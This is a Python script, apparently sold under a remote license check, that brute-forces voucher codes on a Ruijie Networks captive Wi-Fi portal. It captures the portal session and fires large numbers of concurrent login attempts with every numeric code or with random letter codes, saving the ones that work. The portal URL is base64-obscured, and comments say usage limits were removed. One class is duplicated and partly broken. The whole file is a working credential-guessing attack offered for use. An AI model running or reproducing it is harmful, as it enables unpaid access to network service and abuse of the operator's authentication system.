#!/usr/bin/env python3
# -*- coding: utf-8 -*-

import os
import re
import sys
import time
import json
import base64
import random
import string
import hashlib
import requests
import aiohttp
import asyncio
import argparse
from datetime import datetime, date
from urllib.parse import quote, urlparse, parse_qs, urljoin

# ==========================================
# 0. GOOGLE SHEETS LICENSE SYSTEM
# ==========================================
SHEET_CSV_URL = "https://raw.githubusercontent.com/hhtethtet277-svg/my-database-/main/key.txt"


LICENSE_STORAGE = os.path.expanduser("~/.ruijie_license.json")
KEY_STORAGE_FILE = os.path.expanduser("~/.ruijie_device_key.txt")

def get_stable_device_id():
    if os.path.exists(KEY_STORAGE_FILE):
        try:
            with open(KEY_STORAGE_FILE, 'r') as f:
                saved_key = f.read().strip()
                if saved_key:
                    return saved_key
        except:
            pass
    
    try:
        import subprocess
        android_id = subprocess.check_output("settings get secure android_id", shell=True, stderr=subprocess.DEVNULL).decode().strip()
        if android_id and len(android_id) > 5:
            stable_key = hashlib.md5(f"STABLE_{android_id}".encode()).hexdigest()[:16]
        else:
            import uuid
            install_path = os.path.dirname(os.path.abspath(__file__))
            stable_key = hashlib.md5(f"{install_path}{uuid.getnode()}".encode()).hexdigest()[:16]
    except:
        stable_key = ''.join(random.choices(string.ascii_lowercase + string.digits, k=16))
    
    try:
        with open(KEY_STORAGE_FILE, 'w') as f:
            f.write(stable_key)
    except:
        pass
    
    return stable_key

def save_license_to_cache(expiry_date_str):
    data = {"device_id": get_stable_device_id(), "expiry": expiry_date_str, "verified_at": datetime.now().isoformat()}
    try:
        with open(LICENSE_STORAGE, 'w') as f:
            json.dump(data, f)
        return True
    except:
        return False

def load_license_from_cache():
    if not os.path.exists(LICENSE_STORAGE):
        return None
    try:
        with open(LICENSE_STORAGE, 'r') as f:
            data = json.load(f)
            if data.get("device_id") == get_stable_device_id():
                return data
    except:
        pass
    return None

def fetch_online_license():
    try:
        response = requests.get(SHEET_CSV_URL, timeout=10)
        if response.status_code == 200:
            return response.text.strip().split('\n')
    except:
        pass
    return None

def verify_license_online():
    sys_key = get_stable_device_id()
    lines = fetch_online_license()
    
    if lines is None:
        return None, None, "NETWORK_ERROR"
    
    for line in lines:
        line = line.strip()
        if not line or line.lower().startswith('key') or line.lower().startswith('device'):
            continue
        data = [d.strip().strip('"') for d in line.split(',')]
        if data and data[0] == sys_key:
            expiry_str = data[2] if len(data) >= 3 else "UNLIMITED"
            if len(data) >= 4 and "BLOCK" in data[3].upper():
                return False, expiry_str, "BLOCKED"
            if expiry_str != "UNLIMITED":
                try:
                    expiry_date = datetime.strptime(expiry_str, "%Y-%m-%d").date()
                    if date.today() > expiry_date:
                        return False, expiry_str, "EXPIRED"
                except:
                    pass
            return True, expiry_str, "ACTIVE"
    
    return False, "N/A", "NOT_FOUND"

def check_license():
    sys_key = get_stable_device_id()
    print(f"[*] Device ID: {sys_key}")
    
    online_result, expiry_str, msg = verify_license_online()
    
    if online_result is True:
        print(f"{g}[✓] License ACTIVE (Expires: {expiry_str}){w}")
        save_license_to_cache(expiry_str)
        return True
    elif online_result is False:
        print(f"{r}[✗] License INVALID: {msg}{w}")
        cached = load_license_from_cache()
        if cached:
            cached_expiry = cached.get("expiry", "UNLIMITED")
            if cached_expiry != "UNLIMITED":
                try:
                    expiry_date = datetime.strptime(cached_expiry, "%Y-%m-%d").date()
                    if date.today() <= expiry_date:
                        print(f"{g}[✓] Using CACHED license (Expires: {cached_expiry}){w}")
                        return True
                except:
                    pass
        return False
    else:
        cached = load_license_from_cache()
        if cached:
            cached_expiry = cached.get("expiry", "UNLIMITED")
            if cached_expiry != "UNLIMITED":
                try:
                    expiry_date = datetime.strptime(cached_expiry, "%Y-%m-%d").date()
                    if date.today() <= expiry_date:
                        print(f"{g}[✓] Using CACHED license (Offline, Expires: {cached_expiry}){w}")
                        return True
                except:
                    pass
        print(f"{r}[✗] No valid license found (Need internet for first activation){w}")
        return False

# ==========================================
# COLORS
# ==========================================

def clear():
    os.system("clear")

w = "\033[1;00m"
g = "\033[1;32m"
y = "\033[1;33m"
r = "\033[1;31m"
b = "\033[1;34m"

def Line():
    print(f"{y}-{w}"*os.get_terminal_size()[0])

def Logo():
    clear()
    logo = f"""{r},-_/         .     ,--. .        .
'  | . . ,-. |-   | `-' |  . ,-. | ,
   | | | `-. |    |   . |  | |   |<
   | `-^ `-' `'   `--'  `' ' `-' ' `
/` |
`--'  {g}           Voucher Brute Force Tool{w}
{g}     「 Google Sheets License System 」{w}"""
    print(logo)
    Line()
    print(f"{w}[*] This tool is for Ruijie Network Router")
    print(f"{w}[*] License: Google Sheets (Admin Controlled)")
    Line()

# ==========================================
# VOUCHER BRUTE FORCE FUNCTIONS
# ==========================================

SUCCESS = 0
IN_RUNNING_ASCII_BIN = []

try:
    ascii_lower_bin6 = open("ascii_lower_bin6.txt", "r").read().splitlines()
except FileNotFoundError:
    ascii_lower_bin6 = []
try:
    ascii_lower_bin7 = open("ascii_lower_bin7.txt", "r").read().splitlines()
except FileNotFoundError:
    ascii_lower_bin7 = []
try:
    ascii_upper_bin6 = open("ascii_upper_bin6.txt", "r").read().splitlines()
except FileNotFoundError:
    ascii_upper_bin6 = []
try:
    ascii_upper_bin7 = open("ascii_upper_bin7.txt", "r").read().splitlines()
except FileNotFoundError:
    ascii_upper_bin7 = []
try:
    ascii_bin_mix6 = open("ascii_bin_mix6.txt", "r").read().splitlines()
except FileNotFoundError:
    ascii_bin_mix6 = []
try:
    ascii_bin_mix7 = open("ascii_bin_mix7.txt", "r").read().splitlines()
except FileNotFoundError:
    ascii_bin_mix7 = []

async def get_session_id(session, session_url, previous_session_id):
    headers = {
        'authority': 'portal-as.ruijienetworks.com',
        'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
        'accept-language': 'en-US,en;q=0.9',
        'referer': session_url,
        'sec-ch-ua': '"Chromium";v="139", "Not;A=Brand";v="99"',
        'sec-ch-ua-mobile': '?1',
        'sec-ch-ua-platform': '"Android"',
        'sec-fetch-dest': 'document',
        'sec-fetch-mode': 'navigate',
        'sec-fetch-site': 'same-origin',
        'upgrade-insecure-requests': '1',
        'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Mobile Safari/537.36',
    }
    try:
        async with session.get(session_url, headers=headers) as req:
            response = str(req.url)
            session_id = re.search(r"[?&]sessionId=([a-zA-Z0-9]+)", response).group(1)
            return session_id
    except Exception as e:
        return previous_session_id

async def login_voucher(session, session_id, voucher, file=None, check=False, debug=False):
    global SUCCESS
    data = {
        "accessCode": voucher,
        "sessionId": session_id,
        "apiVersion": 1
    }
    post_url = base64.b64decode(b'aHR0cHM6Ly9wb3J0YWwtYXMucnVpamllbmV0d29ya3MuY29tL2FwaS9hdXRoL3ZvdWNoZXIvP2xhbmc9ZW5fVVM=').decode()
    headers = {
        "authority": "portal-as.ruijienetworks.com",
        "accept": "*/*",
        "accept-language": "en-US,en;q=0.9",
        "content-type": "application/json",
        "origin": "https://portal-as.ruijienetworks.com",
        "referer": f"https://portal-as.ruijienetworks.com/download/static/maccauth/src/index.html?RES=./../expand/res/mrlev58jlgslg49ervu&IS_EG=0&sessionId={session_id}",
        "sec-ch-ua": '"Chromium";v="139", "Not;A=Brand";v="99"',
        "sec-ch-ua-mobile": "?1",
        "sec-ch-ua-platform": '"Android"',
        "sec-fetch-dest": "empty",
        "sec-fetch-mode": "cors",
        "sec-fetch-site": "same-origin",
        "user-agent": f'Mozilla/5.0 (Linux; Android 12; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Mobile Safari/537.36',
    }
    try:
        async with session.post(post_url, json=data, headers=headers) as req:
            response = await req.text()
    except Exception as Error:
        return
    if 'logonUrl' in response:
        SUCCESS += 1
        print(f'{g}Success: {voucher}{w}')
        write_file(file="success.txt", data=voucher)
    elif 'expired' in response:
        if not check:
            print(f'{y}Expired: {voucher}{w}')
        write_file(file, voucher)
    elif 'failed' in response:
        if debug:
            print(f'{r}Failed: {voucher}{w}')
        write_file(file, voucher)
    elif 'STA' in response:
        if not check:
            print(f'{b}Limited: {voucher}{w}')
        write_file(file, voucher)

def write_file(file, data):
    with open(file, "a") as f:
        f.write(data+"\n")

def ascii_generator(mode, length):
    if mode == "ascii-lower":
        voucher = "".join(random.choice(string.ascii_lowercase) for _ in range(length))
        if length == 6:
            if not voucher in ascii_lower_bin6 and not voucher in IN_RUNNING_ASCII_BIN:
                return voucher
            else:
                return ascii_generator(mode, length)
        elif length == 7:
            if not voucher in ascii_lower_bin7 and not voucher in IN_RUNNING_ASCII_BIN:
                return voucher
            else:
                return ascii_generator(mode, length)
    elif mode == "ascii-upper":
        voucher = "".join(random.choice(string.ascii_uppercase) for _ in range(length))
        if length == 6:
            if not voucher in ascii_upper_bin6 and not voucher in IN_RUNNING_ASCII_BIN:
                return voucher
            else:
                return ascii_generator(mode, length)
        elif length == 7:
            if not voucher in ascii_upper_bin7 and not voucher in IN_RUNNING_ASCII_BIN:
                return voucher
            else:
                return ascii_generator(mode, length)
    elif mode == "ascii-mix":
        voucher = "".join(random.choice(string.ascii_uppercase+string.ascii_lowercase) for _ in range(length))
        if length == 6:
            if not voucher in ascii_bin_mix6 and not voucher in IN_RUNNING_ASCII_BIN:
                return voucher
            else:
                return ascii_generator(mode, length)
        elif length == 7:
            if not voucher in ascii_bin_mix7 and not voucher in IN_RUNNING_ASCII_BIN:
                return voucher
            else:
                return ascii_generator(mode, length)

def digit_generator(length):
    vouchers = []
    range_ = 1000000 if length == 6 else 10000000
    for i in range(0, range_):
        vouchers.append(str(i).zfill(length))
    return vouchers

# ==========================================
# LIMIT REMOVED - အကုန်လုံးကို ဖြုတ်ထား
# ==========================================

class VoucherCode:
    def __init__(self, is_free_user=None, mode=None, length=None, speed=None, tasks=None, debug=True):
        self.is_free_user = is_free_user
        self.mode = mode
        self.length = length
        self.speed = speed
        self.tasks = tasks
        self.debug = debug
        # LIMIT REMOVED - အောက်ပါစစ်ဆေးချက်ကို ဖယ်ရှားထား
        # if not self.is_free_user:
        #     if is_reached_limit(True):
        #         print(f"{y}[!] You are reached limit")
        #         sys.exit(0)
        
        if self.mode == "digit":
            if self.length == 6:
                self.file = "failed.txt"
            elif self.length == 7:
                self.file = "failed7.txt"
        elif self.mode == "ascii-lower":
            if self.length == 6:
                self.file = "ascii_lower_bin6.txt"
            elif self.length == 7:
                self.file = "ascii_lower_bin7.txt"
        elif self.mode == "ascii-upper":
            if self.length == 6:
                self.file = "ascii_upper_bin6.txt"
            elif self.length == 7:
                self.file = "ascii_upper_bin7.txt"
        elif self.mode == "ascii-mix":
            if self.length == 6:
                self.file = "ascii_bin_mix6.txt"
            elif self.length == 7:
                self.file = "ascii_bin_mix7.txt"
        try:
            self.session_url = open(".session_url", "r").read().strip()
        except FileNotFoundError:
            print(f"{r}[!] Session url not found. Please run setup first.{w}")
            print(f"{y}[!] Run: python voucher.py --setup{w}")
            sys.exit()
    
    def remove_already_checked(self, vouchers):
        try:
            self.fail_code = set(open(self.file, "r").read().splitlines())
        except FileNotFoundError:
            self.fail_code = set()
        try:
            success_code = set(open("success.txt", "r").read().splitlines())
        except FileNotFoundError:
            success_code = set()
        self.removed = list(set(vouchers) - set(self.fail_code) - set(success_code))
        return list(self.removed), list(success_code), list(self.fail_code)

    async def execute_ascii(self):
        global IN_RUNNING_ASCII_BIN
        connector = aiohttp.TCPConnector(limit=self.speed)
        timeout = aiohttp.ClientTimeout(total=20)
        if self.mode == "ascii-lower" and self.length == 6:
            checked = str(len(ascii_lower_bin6))
        elif self.mode == "ascii-lower" and self.length == 7:
            checked = str(len(ascii_lower_bin7))
        elif self.mode == "ascii-upper" and self.length == 6:
            checked = str(len(ascii_upper_bin6))
        elif self.mode == "ascii-upper" and self.length == 7:
            checked = str(len(ascii_upper_bin7))
        elif self.mode == "ascii-mix" and self.length == 6:
            checked = str(len(ascii_bin_mix6))
        elif self.mode == "ascii-mix" and self.length == 7:
            checked = str(len(ascii_bin_mix7))
        Logo()
        print(f"[*] Generated voucher codes (unlimited)")
        print(f"[*] Already checked codes ({checked})")
        print(f"[*] success vouchers and failed vouchers are saved in local")
        Line()
        print(f"[*] Bruteforce mode {self.mode}")
        print(f"[*] Voucher code length {str(self.length)}")
        print(f"[*] Bruteforce speed {str(self.speed)}")
        print(f"[*] Bruteforce tasks {str(self.tasks)}")
        print(f"[*] Show debug message {str(self.debug)}")
        Line()
        print(f"{g}[+] Voucher code bruteforce process is running...")
        Line()
        try:
            async with aiohttp.ClientSession(connector=connector, timeout=timeout) as session:
                tasks = []
                loop = 0
                while True:
                    voucher = ascii_generator(self.mode, self.length)
                    # LIMIT REMOVED - success limit စစ်ဆေးချက်ကို ဖယ်ရှားထား
                    # if not self.is_free_user:
                    #     if SUCCESS >= 3:
                    #         is_reached_limit(False)
                    #         print(f"{y}[!] You are reached limit")
                    #         break
                    if loop % 90 == 0:
                        session_id = await get_session_id(session, self.session_url, None)
                    tasks.append(login_voucher(session, session_id, voucher, file=self.file, debug=self.debug))
                    if len(tasks) >= self.tasks:
                        await asyncio.gather(*tasks)
                        tasks = []
                    loop += 1
                    IN_RUNNING_ASCII_BIN.append(voucher)
                if tasks:
                    await asyncio.gather(*tasks)
        except KeyboardInterrupt:
            print(f"{y}[*] User cancel called")
            sys.exit(0)
        Line()
        print(f"{g}[*] Process is finished")
        sys.exit(0)

    async def execute_digit(self):
        generated_code = digit_generator(length=self.length)
        vouchers_code, success_code, fail_code = self.remove_already_checked(generated_code)
        connector = aiohttp.TCPConnector(limit=self.speed)
        timeout = aiohttp.ClientTimeout(total=20)
        Logo()
        print(f"[*] Generated voucher codes ({len(generated_code)})")
        print(f"[*] Already checked codes ({len(generated_code)-len(vouchers_code)})")
        print(f"[*] Still remain to check codes ({len(vouchers_code)})")
        print(f"[*] success vouchers and failed vouchers are saved in local")
        Line()
        print(f"[*] Bruteforce mode {self.mode}")
        print(f"[*] Voucher code length {str(self.length)}")
        print(f"[*] Bruteforce speed {str(self.speed)}")
        print(f"[*] Bruteforce tasks {str(self.tasks)}")
        print(f"[*] Show debug message {str(self.debug)}")
        Line()
        print(f"{g}[+] Voucher code bruteforce process is running...")
        Line()
        try:
            async with aiohttp.ClientSession(connector=connector, timeout=timeout) as session:
                tasks = []
                for loop, voucher in enumerate(vouchers_code, start=0):
                    # LIMIT REMOVED - success limit စစ်ဆေးချက်ကို ဖယ်ရှားထား
                    # if not self.is_free_user:
                    #     if SUCCESS >= 3:
                    #         is_reached_limit(False)
                    #         print(f"{y}[!] You are reached limit")
                    #         break
                    if loop % 90 == 0:
                        session_id = await get_session_id(session, self.session_url, None)
                    tasks.append(login_voucher(session, session_id, voucher, file=self.file, debug=self.debug))
                    if len(tasks) >= self.tasks:
                        await asyncio.gather(*tasks)
                        tasks = []
                if tasks:
                    await asyncio.gather(*tasks)
        except KeyboardInterrupt:
            print(f"{y}[*] User cancel called")
            sys.exit(0)
        Line()
        print(f"{g}[*] Process is finished")
        sys.exit(0)

class RecheckVoucher:
    def __init__(self):
        self.file = "failed.txt" or "failed7.txt"
        try:
            self.success_code = open("success.txt", "r").read().splitlines()
        except Exception as err:
            print(f"{r}[!] Exit, you didn't have any success code")
            sys.exit(0)
        if len(self.success_code) == 0:
            print(f"{r}[!] Exit, you didn't have any success code")
            sys.exit(0)
        try:
            self.session_url = open(".session_url", "r").read().strip()
        except FileNotFoundError:
            print(f"{r}[!] Session url not found. Please run setup first.{w}")
            sys.exit()
    
    async def execute_digit(self):
        generated_code = digit_generator(length=self.length)
        vouchers_code, success_code, fail_code = self.remove_already_checked(generated_code)
        connector = aiohttp.TCPConnector(limit=self.speed)
        timeout = aiohttp.ClientTimeout(total=20)
        Logo()
        print(f"[*] Generated voucher codes ({len(generated_code)})")
        print(f"[*] Already checked codes ({len(generated_code)-len(vouchers_code)})")
        print(f"[*] Still remain to check codes ({len(vouchers_code)})")
        print(f"[*] success vouchers and failed vouchers are saved in local")
        Line()
        print(f"[*] Bruteforce mode {self.mode}")
        print(f"[*] Voucher code length {str(self.length)}")
        print(f"[*] Bruteforce speed {str(self.speed)}")
        print(f"[*] Bruteforce tasks {str(self.tasks)}")
        print(f"[*] Show debug message {str(self.debug)}")
        Line()
        print(f"{g}[+] Voucher code bruteforce process is running...")
        Line()
        try:
            async with aiohttp.ClientSession(connector=connector, timeout=timeout) as session:
                tasks = []
                for loop, voucher in enumerate(vouchers_code, start=0):
                    # LIMIT REMOVED - success limit စစ်ဆေးချက်ကို ဖယ်ရှားထား
                    # if not self.is_free_user:
                    #     if SUCCESS >= 3:
                    #         is_reached_limit(False)
                    #         print(f"{y}[!] You are reached limit")
                    #         break
                    if loop % 90 == 0:
                        session_id = await get_session_id(session, self.session_url, None)
                    tasks.append(login_voucher(session, session_id, voucher, file=self.file, debug=self.debug))
                    if len(tasks) >= self.tasks:
                        await asyncio.gather(*tasks)
                        tasks = []
                if tasks:
                    await asyncio.gather(*tasks)
        except KeyboardInterrupt:
            print(f"{y}[*] User cancel called")
            sys.exit(0)
        Line()
        print(f"{g}[*] Process is finished")
        sys.exit(0)

class RecheckVoucher:
    def __init__(self):
        self.file = "failed.txt" or "failed7.txt"
        try:
            self.success_code = open("success.txt", "r").read().splitlines()
        except Exception as err:
            print(f"{r}[!] Exit, you didn't have any success code")
            sys.exit(0)
        if len(self.success_code) == 0:
            print(f"{r}[!] Exit, you didn't have any success code")
            sys.exit(0)
        try:
            self.session_url = open(".session_url", "r").read().strip()
        except FileNotFoundError:
            print(f"{r}[!] Session url not found. Please run setup first.{w}")
            sys.exit()
    
    async def check(self):
        Logo()
        print(f"{y}[*] Don't stop this program while running")
        Line()
        print(f"{g}[+] The success code recheck program is starting...")
        Line()
        if os.path.exists("success.txt"):
            os.remove("success.txt")
        connector = aiohttp.TCPConnector(limit=30)
        timeout = aiohttp.ClientTimeout(total=20)
        try:
            async with aiohttp.ClientSession(connector=connector, timeout=timeout) as session:
                tasks = []
                for loop, voucher in enumerate(self.success_code, start=0):
                    if loop % 90 == 0:
                        session_id = await get_session_id(session, self.session_url, None)
                    tasks.append(login_voucher(session, session_id, voucher, file=self.file, check=True))
                    if len(tasks) >= 5:
                        await asyncio.gather(*tasks)
                        tasks = []
                if tasks:
                    await asyncio.gather(*tasks)
        except KeyboardInterrupt:
            print(f"{y}[*] User cancel called")
            sys.exit(0)
        Line()
        print(f"{g}[*] Recheck success voucher code process is finished")

# ==========================================
# SETUP FUNCTION (For first time)
# ==========================================

def setup():
    Logo()
    print(f"{g}[+] Setup Mode - Capturing Session Info{w}")
    print(f"{y}[!] Make sure you are connected to the Wi-Fi{w}")
    Line()
    
    try:
        localhost = requests.get("http://192.168.0.1", timeout=10).url
        ip = re.search(r'gw_address=(.*?)&', localhost).group(1)
        
        print(f"{g}[✓] Gateway IP: {ip}{w}")
        
        headers = {
            'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 Chrome/139.0.0.0 Mobile Safari/537.36',
        }
        req = requests.get(localhost, headers=headers).text
        session_url_match = re.search(r"href='(.*?)'</script>", req)
        
        if session_url_match:
            session_url = "https://portal-as.ruijienetworks.com" + session_url_match.group(1)
            with open(".session_url", "w") as f:
                f.write(session_url)
            print(f"{g}[✓] Session URL saved{w}")
        else:
            print(f"{r}[✗] Could not extract session URL{w}")
            sys.exit(1)
        
        with open(".ip", "w") as f:
            f.write(ip)
        
        Line()
        print(f"{g}[✓] Setup completed successfully!{w}")
        print(f"{g}[✓] Now you can run brute force commands{w}")
        
    except Exception as err:
        print(f"{r}[✗] Setup failed: {err}{w}")
        print(f"{y}[!] Make sure you are connected to the Wi-Fi and try again{w}")
        sys.exit(1)

# ==========================================
# MAIN
# ==========================================

def print_help():
    print(f"""
{g}══════════════════════════════════════════════════════════════════{w}
{g}                    VOUCHER BRUTE FORCE COMMANDS                    {w}
{g}══════════════════════════════════════════════════════════════════{w}

{y}▶ Digit (ဂဏန်း){w}
   python voucher.py -o code -m digit -l 6 -s 100 -t 100 -d
   python voucher.py -o code -m digit -l 7 -s 100 -t 100 -d

{y}▶ ASCII Lowercase (အင်္ဂလိပ်စာလုံးအသေး){w}
   python voucher.py -o code -m ascii-lower -l 6 -s 100 -t 100 -d
   python voucher.py -o code -m ascii-lower -l 7 -s 100 -t 100 -d

{y}▶ ASCII Uppercase (အင်္ဂလိပ်စာလုံးအကြီး){w}
   python voucher.py -o code -m ascii-upper -l 6 -s 100 -t 100 -d
   python voucher.py -o code -m ascii-upper -l 7 -s 100 -t 100 -d

{y}▶ ASCII Mix (အကြီးအသေးစပ်){w}
   python voucher.py -o code -m ascii-mix -l 6 -s 100 -t 100 -d
   python voucher.py -o code -m ascii-mix -l 7 -s 100 -t 100 -d

{y}▶ Other Commands{w}
   python voucher.py --key          # Show device ID
   python voucher.py --reset        # Clear all cache
   python voucher.py --setup        # Run setup
   python voucher.py -o check       # Recheck success codes

{g}══════════════════════════════════════════════════════════════════{w}
""")

def feature():
    Logo()
    
    # Check license first
    if not check_license():
        print(f"{r}[!] License check failed. Use --key to get your device ID.{w}")
        print(f"{y}[!] Add your device ID to Google Sheets Column A{w}")
        print(f"{y}[!] Then run: python voucher.py --reset && python voucher.py -o code ...{w}")
        sys.exit(1)
    
    parser = argparse.ArgumentParser(add_help=False)
    parser.add_argument("-o", "--option", help="features option", choices=["code", "check", "setup"], required=True)
    parser.add_argument("-m", "--mode", help="type of voucher code", choices=["digit", "ascii-lower", "ascii-upper", "ascii-mix"], default="digit")
    parser.add_argument("-l", "--length", help="length of voucher code(default 6)", choices=[6,7], type=int, default=6)
    parser.add_argument("-s", "--speed", help="voucher code bruteforce speed", type=int, default=100)
    parser.add_argument("-t", "--tasks", help="number of tasks for parallel works", type=int, default=100)
    parser.add_argument("-d", "--debug", help="to show debug message", action="store_true")
    parser.add_argument("-h", "--help", help="show help", action="store_true")
    args = parser.parse_args()
    
    if args.help:
        print_help()
        sys.exit(0)
    
    option = args.option
    
    if option == "code":
        mode = args.mode
        length = args.length
        speed = args.speed
        tasks = args.tasks
        debug = args.debug
        is_free_user = False
        vobj = VoucherCode(is_free_user=is_free_user, mode=mode, length=length, speed=speed, tasks=tasks, debug=debug)
        if mode == "digit":
            asyncio.run(vobj.execute_digit())
        elif mode == "ascii-lower" or mode == "ascii-upper" or mode == "ascii-mix":
            asyncio.run(vobj.execute_ascii())
    elif option == "check":
        robj = RecheckVoucher()
        asyncio.run(robj.check())
    elif option == "setup":
        setup()

if __name__ == "__main__":
    # Simple command line helpers (no -o required)
    if len(sys.argv) > 1:
        if sys.argv[1] == "--key":
            print(f"\n{g}Device ID: {get_stable_device_id()}{w}")
            print(f"{y}Add this to Column A in Google Sheets{w}")
            sys.exit(0)
        elif sys.argv[1] == "--reset":
            for f in [LICENSE_STORAGE, KEY_STORAGE_FILE, ".ip", ".session_url"]:
                if os.path.exists(f):
                    os.remove(f)
            print(f"{g}[✓] All cache cleared. Run --setup again.{w}")
            sys.exit(0)
        elif sys.argv[1] == "--setup":
            setup()
            sys.exit(0)
        elif sys.argv[1] == "--help" or sys.argv[1] == "-h":
            print_help()
            sys.exit(0)
    
    feature()
